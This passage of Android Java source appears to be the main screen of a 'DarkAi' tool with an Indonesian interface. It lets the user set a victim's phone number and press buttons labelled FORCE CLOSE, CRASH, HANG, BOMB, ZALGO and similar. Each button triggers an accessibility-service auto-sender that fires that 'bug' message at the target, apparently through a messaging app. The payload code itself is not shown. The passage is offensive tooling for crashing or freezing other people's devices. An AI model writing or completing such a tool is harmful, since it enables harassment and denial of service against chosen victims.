        title.setTextColor(Color.parseColor("#00F0FF"));
        title.setTextSize(24);
        title.setGravity(Gravity.CENTER);
        root.addView(title);

        Button btnAcc = new Button(this);
        btnAcc.setText("AKTIFKAN AUTO-SEND");
        btnAcc.setBackgroundColor(Color.parseColor("#00D4FF"));
        btnAcc.setTextColor(Color.WHITE);
        btnAcc.setOnClickListener(v -> startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)));
        root.addView(btnAcc);

        etNomor = new EditText(this);
        etNomor.setHint("628xxxxxxxxxx");
        etNomor.setInputType(android.text.InputType.TYPE_CLASS_PHONE);
        etNomor.setTextColor(Color.WHITE);
        etNomor.setBackgroundColor(Color.parseColor("#150A26"));
        etNomor.setPadding(30, 30, 30, 30);
        root.addView(etNomor);

        Button btnSet = new Button(this);
        btnSet.setText("SET TARGET");
        btnSet.setBackgroundColor(Color.parseColor("#8B5CF6"));
        btnSet.setTextColor(Color.WHITE);
        btnSet.setOnClickListener(v -> {
            String n = etNomor.getText().toString().replaceAll("[^0-9]", "");
            if (n.length() < 8) { Toast.makeText(this, "Nomor tidak valid", Toast.LENGTH_SHORT).show(); return; }
            target = n;
            Toast.makeText(this, "Target: +" + n, Toast.LENGTH_SHORT).show();
            log("Target: +" + n);
        });
        root.addView(btnSet);

        String[][] bugs = {
            {"FORCE CLOSE", "fc"}, {"DELAY", "delay"}, {"BLANK", "blank"}, {"RTL", "rtl"},
            {"ZALGO", "zalgo"}, {"BOMB", "bomb"}, {"CRASH", "crash"}, {"HANG", "hang"}
        };
        for (String[] bug : bugs) {
            Button btn = new Button(this);
            btn.setText(bug[0]);
            btn.setBackgroundColor(Color.parseColor("#FF2D95"));
            btn.setTextColor(Color.WHITE);
            final String jenis = bug[1];
            btn.setOnClickListener(v -> {
                if (target.isEmpty()) { Toast.makeText(this, "Set target dulu!", Toast.LENGTH_SHORT).show(); return; }
                if (AutoSendService.instance == null) {
                    Toast.makeText(this, "Aktifkan Accessibility!", Toast.LENGTH_SHORT).show();
                    startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
                    return;
                }
                AutoSendService.instance.triggerSend(target, jenis);
                log("BUG " + jenis.toUpperCase() + " -> +" + target);
                Toast.makeText(this, "Kirim " + jenis, Toast.LENGTH_SHORT).show();
            });
            root.addView(btn);
        }

        tvLog = new TextView(this);
        tvLog.setText("[DarkAi] Ready...");
        tvLog.setTextColor(Color.parseColor("#25D366"));
        tvLog.setTypeface(Typeface.MONOSPACE);
        tvLog.setTextSize(10);
        tvLog.setBackgroundColor(Color.BLACK);
        tvLog.setPadding(20, 20, 20, 20);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, 500);
        tvLog.setLayoutParams(lp);
        root.addView(tvLog);

        sv.addView(root);
        setContentView(sv);
    }

    private void log(String s) {
        String t = new java.text.SimpleDateFormat("HH:mm:ss").format(new java.util.Date());
        tvLog.append("\n[" + t + "] " + s);
    }
